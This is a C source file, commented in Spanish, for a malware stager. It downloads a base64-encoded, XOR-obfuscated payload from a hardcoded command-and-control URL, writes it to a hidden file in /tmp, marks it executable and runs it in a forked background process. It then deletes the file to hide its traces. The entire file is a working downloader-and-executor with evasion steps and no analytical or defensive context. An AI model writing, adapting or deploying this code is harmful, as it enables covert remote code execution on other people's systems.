#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <curl/curl.h>

#define C2_URL "http://10.10.14.91/beacon.enc"
#define XOR_KEY 0x33
#define MAX_PATH 256

// Estructura para almacenar datos descargados
struct MemoryStruct {
    char *memory;
    size_t size;
};

// Callback para curl: acumula datos
static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr) {
        printf("No memory (realloc)\n");
        return 0;
    }

    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;

    return realsize;
}

// Función XOR
void xor_data(unsigned char* data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= XOR_KEY;
    }
}

// Decodificador Base64 básico
// Tabla de caracteres Base64
static int base64_index(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

int base64_decode(const char* in, size_t in_len, unsigned char** out) {
    if (in_len % 4 != 0) return 0;

    size_t out_len = in_len / 4 * 3;
    if (in[in_len - 1] == '=') out_len--;
    if (in[in_len - 2] == '=') out_len--;

    unsigned char* decoded = malloc(out_len);
    if (!decoded) return 0;

    int i, j = 0;
    for (i = 0; i < in_len; i += 4) {
        int quad[4];
        for (int k = 0; k < 4; k++) {
            if (i + k >= in_len || in[i + k] == '=') {
                quad[k] = 0;
            } else {
                quad[k] = base64_index(in[i + k]);
                if (quad[k] == -1) {
                    free(decoded);
                    return 0;
                }
            }
        }

        decoded[j++] = (quad[0] << 2) | (quad[1] >> 4);
        if (j < out_len) decoded[j++] = ((quad[1] & 0xF) << 4) | (quad[2] >> 2);
        if (j < out_len) decoded[j++] = ((quad[2] & 0x3) << 6) | quad[3];
    }

    *out = decoded;
    return out_len;
}

int main() {
    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;

    chunk.memory = malloc(1);
    chunk.size = 0;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (!curl) {
        return 1;
    }

    curl_easy_setopt(curl, CURLOPT_URL, C2_URL);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0");
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);

    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        curl_easy_cleanup(curl);
        free(chunk.memory);
        curl_global_cleanup();
        return 1;
    }

    curl_easy_cleanup(curl);
    curl_global_cleanup();

    if (chunk.size == 0) {
        free(chunk.memory);
        return 1;
    }

    // Decodificar Base64
    unsigned char* raw_payload;
    int raw_len = base64_decode(chunk.memory, chunk.size, &raw_payload);
    free(chunk.memory);

    if (raw_len <= 0) {
        return 1;
    }

    // Aplicar XOR
    xor_data(raw_payload, raw_len);

    // Ruta temporal: /tmp/.tmpXXXXXX (archivo oculto)
    char target_path[MAX_PATH];
    snprintf(target_path, sizeof(target_path), "/tmp/.tmpXXXXXX");
    int fd = mkstemp(target_path);
    if (fd == -1) {
        free(raw_payload);
        return 1;
    }

    // Escribir payload
    write(fd, raw_payload, raw_len);
    close(fd);
    free(raw_payload);

    // Hacerlo ejecutable
    chmod(target_path, 0700);

    // Ejecutar en segundo plano
    pid_t pid = fork();
    if (pid == 0) {
        // Proceso hijo
        execl(target_path, target_path, (char *)NULL);
        exit(1);  // Si execl falla
    } else if (pid > 0) {
        // Proceso padre: espera 2 segundos
        sleep(2);
        // Eliminar archivo
        unlink(target_path);  // Borra el archivo (pero sigue ejecutándose si el hijo lo tiene abierto)
    } else {
        // fork falló
        unlink(target_path);
        return 1;
    }

    return 0;
}
